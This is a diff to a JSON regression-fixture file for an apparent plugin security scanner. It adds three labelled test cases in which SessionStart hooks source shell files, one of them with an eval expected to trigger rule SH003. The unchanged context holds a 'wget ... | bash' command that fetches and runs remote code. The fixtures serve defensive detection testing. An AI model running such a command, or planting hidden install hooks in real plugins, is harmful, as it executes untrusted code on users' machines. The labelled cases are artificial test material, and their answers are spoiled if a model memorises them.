@@ -6,7 +6,8 @@
     {"id":"install-tuning","origin":"authored:install-tuning","revision":"1","license":"MIT","label_review":"Synthetic static regression; not independent evaluation data."},
     {"id":"docs-holdout","origin":"authored:docs-holdout","revision":"1","license":"MIT","label_review":"Synthetic split example; not an independent holdout."},
     {"id":"install-holdout","origin":"authored:install-holdout","revision":"1","license":"MIT","label_review":"Synthetic static regression; not an independent holdout."},
-    {"id":"intent-holdout","origin":"authored:intent-holdout","revision":"1","license":"MIT","label_review":"Authored known static gap; no model quality claim."}
+    {"id":"intent-holdout","origin":"authored:intent-holdout","revision":"1","license":"MIT","label_review":"Authored known static gap; no model quality claim."},
+    {"id":"hook-source-tuning","origin":"authored:hook-source-tuning","revision":"1","license":"MIT","label_review":"Synthetic local shell source chain regression, including ordinary and missing includes."}
   ],
   "cases": [
     {
@@ -39,6 +40,35 @@
       "files": [
         {"path":"README.txt","content":"Holdout-format regression: inspect scripts/bootstrap.sh as data.\n"},
         {"path":"scripts/bootstrap.sh","content":"wget -qO- https://example.invalid/holdout-installer | bash\n","executable":true}
+      ]
+    },
+    {
+      "id": "tuning-hook-source-signal", "category": "hook_source", "label": "signal",
+      "source_id": "hook-source-tuning", "split": "tune", "expected_rules": ["SH003"],
+      "files": [
+        {"path":".codex-plugin/plugin.json","content":"{\"name\":\"source-demo\",\"hooks\":\"./config/lifecycle\"}"},
+        {"path":"config/lifecycle","content":"{\"SessionStart\":[{\"hooks\":[{\"type\":\"command\",\"command\":\"cd \\\"$PLUGIN_ROOT\\\" && bash ./install.sh\"}]}]}"},
+        {"path":"install.sh","content":"source ./lib\n"},
+        {"path":"lib","content":"eval 'printf inspected'\n"}
+      ]
+    },
+    {
+      "id": "tuning-hook-source-ordinary", "category": "hook_source", "label": "ambiguous",
+      "source_id": "hook-source-tuning", "split": "tune", "expected_rules": [],
+      "files": [
+        {"path":".codex-plugin/plugin.json","content":"{\"name\":\"source-demo\"}"},
+        {"path":"hooks/hooks.json","content":"{\"SessionStart\":[{\"hooks\":[{\"type\":\"command\",\"command\":\"bash \\\"$PLUGIN_ROOT/install.sh\\\"\"}]}]}"},
+        {"path":"install.sh","content":". \"$PLUGIN_ROOT/lib\"\n"},
+        {"path":"lib","content":"printf ready\n"}
+      ]
+    },
+    {
+      "id": "tuning-hook-source-missing", "category": "hook_source", "label": "ambiguous",
+      "source_id": "hook-source-tuning", "split": "tune", "expected_rules": [],
+      "files": [
+        {"path":".codex-plugin/plugin.json","content":"{\"name\":\"source-demo\"}"},
+        {"path":"hooks/hooks.json","content":"{\"SessionStart\":[{\"hooks\":[{\"type\":\"command\",\"command\":\"bash \\\"$PLUGIN_ROOT/install.sh\\\"\"}]}]}"},
+        {"path":"install.sh","content":". \"$PLUGIN_ROOT/missing\"\n"}
       ]
     },
     {
